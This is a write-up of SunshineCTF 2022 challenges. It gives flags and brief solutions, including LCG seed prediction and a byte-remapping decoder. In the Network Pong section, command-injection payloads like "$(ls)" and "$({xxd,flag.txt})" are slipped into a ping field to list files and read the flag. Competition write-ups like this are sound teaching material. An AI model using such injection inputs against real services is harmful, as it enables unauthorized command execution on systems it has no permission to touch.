# SunshineCTF 2022

## Roll Call
`sun{here}`


## Matr... I mean Discord
`sun{i_love_centralized_chat_platforms}`


## Transparency
Use [crt.sh](https://crt.sh/) to look up sunshinectf.org.

`sun-look-there-its-in-the-logs-endflag`


## Inspect Element
`sun{prepare_for_a_lawsuit}`


## Network Pong
Messing around and trying to execute commands
```
`ls`
`$PATH`
`$PWD`
$({echo,sunshinectf.org})
```

Figuring out how to read output of commands
```
"$(ls)"
```
> ping: bad address 'Dockerfile<br>
> docker-entrypoint.sh<br>
> flag.txt<br>
> index.py<br>
> requirements.txt<br>
> templates'

Reading flag without `cat`, `head`, or `tail`
```
"$({xxd,flag.txt})"
```
> ping: bad address '00000000: 7375 6e7b 7069 6e39 5f70 696e 392d 7069  sun{pin9_pin9-pi<br>
> 00000010: 6e39 5f66 3140 395f 7069 6e39 7d0a       n9_f1@9_pin9}.'

`sun{pin9_pin9-pin9_f1@9_pin9}`


## PredictorProgrammer 1
I just entered `0` and it gave me the flag?

```
PredictorProgrammer... new and improved! No longer vulnerable to eval injection!
...oooooooh we are going to play a game... of Prediction!
Super duper easy! You have one life to get the answer correct!
If you get the answer correct... you'll receive a key, one of three.
A person who has all three keys... well... nothing special happens.
But back to prediction...
So we're on the up-and-level with each other, I'm using this code to come up with a totally random number:

# if knuth made it it must be secure!
def knuth_linear_congruential_generator(state):
    return (state * 6364136223846793005) + 1442695040888963407 % (2 ** 64)

#debugggg seed = 1668888570434

The current date is Sat, 19 Nov 2022 20:09:30 +0000, you have 30 seconds to guess the next number correctly.
Predict the future... if you dare!
What number am I thinking of, from 0 to 18446744073709551615:
0
I was thinking of 18393498226213793001...

...

Hooooowwww? How did you solve it?

...

... oh well here's your first key, as promised:
b'sun{oops_i_thought_i_was_in_release}'

Fine. I'll make a better game. ONE WITH A PRINCESS IN ANOTHER CASTLE! 🔥🏰🔥

predictor.sunshinectf.games 22202 holds your next key.
```

`sun{oops_i_thought_i_was_in_release}`


## PEG_GIMME
Ran provided file in a VM.

`sun{th4t_w4s_3a5y}`


## Predictor Programmer 2
Be careful about time zones.
Generate all possible seeds and then eliminate them using the information provided from each guess about whether the guess is too big/small.

`sun{well_i_guess_it_was_time}`


## Exotic Bytes
Convert to hex bytes and notice that every third byte is `ea`.
```
ea b1 b3 
ea b1 b5 
ea b1 ae 
ea b1 bb 
ea b1 a2 
ea b0 b4 
ea b1 b3 
ea b0 b3 
ea b1 9f 
ea b0 b1 
ea b0 b2 
ea b0 b8 
ea b1 9f 
ea b0 b1 
ea b0 b5 
ea b1 9f 
ea b1 a2 
ea b0 b1 
ea b1 b4 
ea b1 9f 
ea b1 b2 
ea b0 b3 
ea b1 ad 
ea b0 b4 
ea b1 b0 
ea b1 b0 
ea b0 b1 
ea b1 ae 
ea b1 a7 
ea b1 bd
```

The difference between the first two lines is 2, which is the same as the difference between `s` and `u`, the first two characters of the flag format.
Remove the `ea` byte and lower the second byte from `b0` and `b1` to `0` and `1`.
Then mess around a bit until something readable shows up.
```python3
s = "걳걵걮걻걢갴걳갳걟갱갲갸걟갱갵걟걢갱건걟걲갳걭갴거거갱걮걧걽".encode()
chars = [int.from_bytes(s[i:i+3], "big") - 0xeab09f for i in range(0, len(s), 3)]
chars = [(c & 0xFF00) >> 2 | (c & 0xFF) for c in chars]
print(''.join([chr(c + ord('s') - chars[0]) for c in chars]))
```

`sun{b4s3_128_15_b1t_r3m4pp1ng}`


## Predictor Programmer 3
Digging around a bit on StackOverflow finds the [paper](http://www.reteam.org/papers/e59.pdf) referenced in the challenge description.
The implementation is straightforward, as long as you aren't silly like me and forget to add parentheses while calculating `a`.


`sun{bah_figures_lcgs_are_not_cryptographically_secure}`


















## Lets-a-go
```c
void FUN_005c85c4(undefined4 *param_1,undefined8 param_2,undefined8 param_3,uint param_4) {
  undefined4 uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined uVar4;
  ulong unaff_RBP;
  
  puVar3 = (undefined4 *)((long)param_1 + unaff_RBP);
  uVar4 = *(undefined *)puVar3;
  if ((5 < param_4) && (unaff_RBP < 0xfffffffffffffffd)) {
    uVar2 = param_4 - 4;
    do {
      param_4 = uVar2;
      uVar1 = *puVar3;
      puVar3 = puVar3 + 1;
      *param_1 = uVar1;
      param_1 = param_1 + 1;
      uVar2 = param_4 - 4;
    } while (3 < param_4);
    uVar4 = *(undefined *)puVar3;
    if (param_4 == 0) {
      return;
    }
  }
  do {
    puVar3 = (undefined4 *)((long)puVar3 + 1);
    *(undefined *)param_1 = uVar4;
    param_4 = param_4 - 1;
    uVar4 = *(undefined *)puVar3;
    param_1 = (undefined4 *)((long)param_1 + 1);
  } while (param_4 != 0);
  return;
}
```

```
void f(int *par1, int par2, int par3, int i) {
    int u1, u2, p3, u4;
    if (i > 5) {
        u2 = i - 4;
        do {
            i = u2;
            u1 = *p3;
            p3++;
            *par1 = u1;
            par1++;
            u2 = i - 4;
        } while (i > 3);
        u4 = *(*)p3;
        if (i == 0) return;
    }
    do {
        p3 = (*)(p3 + 1);
        *(*par1) = u4;
        i--;
        u4 = *(*)p3;
        par1 = (*)(par1 + 1);
    }
}```